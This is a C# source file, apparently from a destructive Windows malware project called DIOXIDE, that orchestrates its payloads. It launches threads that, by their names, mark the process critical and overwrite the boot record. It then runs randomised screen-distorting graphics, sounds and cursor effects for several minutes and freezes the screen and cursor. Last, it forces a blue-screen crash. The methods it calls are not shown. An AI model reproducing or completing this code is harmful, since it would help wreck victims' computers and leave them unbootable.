using System;
using System.Threading;

namespace DIOXIDE
{
    class run_payloads
    {
        public static int rp_cancel = 0;
        public unsafe static void DStart()
        {
            payloads payloads = new payloads();
            destruction destruction = new destruction();

            new Thread(new ThreadStart(payloads.Clicker)).Start();
            new Thread(new ThreadStart(destruction.SetCriticalProcess)).Start();
            new Thread(new ThreadStart(destruction.OverwriteBoot)).Start();

            PStart();

            destruction.BSOD();

            Environment.Exit(0);
        }
        public unsafe static void PStart()
        {
            int True = 1;
            run_payloads rp = new run_payloads();

            new Thread(new ThreadStart(rp.randPayload_run)).Start();
            Thread.Sleep(220000);
            rp_cancel = True;
            rp.FinalPayload_run();
            return;
        }

        private void randPayload_run()
        {
            run_payloads rp = new run_payloads();
            payloads p = new payloads();
            int True = 1;

            new Thread(new ThreadStart(p.gdi1)).Start();
            p.Sound1();
            p.gdi1_cancel = True;

            while (true)
            {
                Random rnad = new Random();

                int number = rnad.Next(1, 9);

                if (number == 1)
                {
                    new Thread(new ThreadStart(p.gdi2)).Start();
                    new Thread(new ThreadStart(p.cursor_movement)).Start();
                    p.Sound2();
                    p.gdi2_cancel = True;
                }

                if (number == 2)
                {
                    new Thread(new ThreadStart(p.gdi3)).Start();
                    p.Sound3();
                    p.gdi3_cancel = True;
                }

                if (number == 3)
                {
                    new Thread(new ThreadStart(p.CursorDraw)).Start();
                    new Thread(new ThreadStart(p.gdi2)).Start();
                    new Thread(new ThreadStart(p.gdi3)).Start();
                    p.Sound4();
                    p.gdi2_cancel = True;
                    p.gdi3_cancel = True;
                }

                if (number == 4)
                {
                    new Thread(new ThreadStart(p.gdi4)).Start();
                    p.Sound5();
                    p.gdi4_cancel = True;
                }

                if (number == 5)
                {
                    new Thread(new ThreadStart(p.gdi5)).Start();
                    p.Sound6();
                    p.gdi5_cancel = True;
                }

                if (number == 6)
                {
                    new Thread(new ThreadStart(p.gdi6)).Start();
                    p.Sound7();
                    new Thread(new ThreadStart(p.gdi7)).Start();
                    p.Sound8();
                    p.gdi6_cancel = True;
                    p.gdi7_cancel = True;
                }

                if (number == 7)
                {
                    new Thread(new ThreadStart(p.gdi8)).Start();
                    p.Sound9();
                    p.gdi8_cancel = True;
                }
                if (number == 8)
                {
                    new Thread(new ThreadStart(p.gdi9)).Start();
                    p.Sound10();
                    p.gdi9_cancel = True;
                }
                if (number == 9)
                {
                    new Thread(new ThreadStart(p.gdi10)).Start();
                    p.Sound11();
                    p.gdi10_cancel = True;
                }


                if (rp_cancel == 1)
                {
                    return;
                }
            }
        }
        private void FinalPayload_run()
        {
            //160sec
            payloads p = new payloads();
            int True = 1;
            new Thread(new ThreadStart(p.Finalgdi1)).Start();
            new Thread(new ThreadStart(p.Finalgdi2)).Start();
            new Thread(new ThreadStart(p.Finalgdi3)).Start();
            new Thread(new ThreadStart(p.Finalgdi4)).Start();
            p.FinalSound();
            p.drawCursor_cancel = True;

            p.Finalgdi1_cancel = True;
            p.Finalgdi2_cancel = True;
            p.Finalgdi3_cancel = True;
            p.Finalgdi4_cancel = True;
            p.cursor_movement_cancel = True;
            new Thread(new ThreadStart(p.cursor_Freeze)).Start();
            new Thread(new ThreadStart(p.screen_Freeze)).Start();
            p.FreezeSound();

            return;
        }
    }
}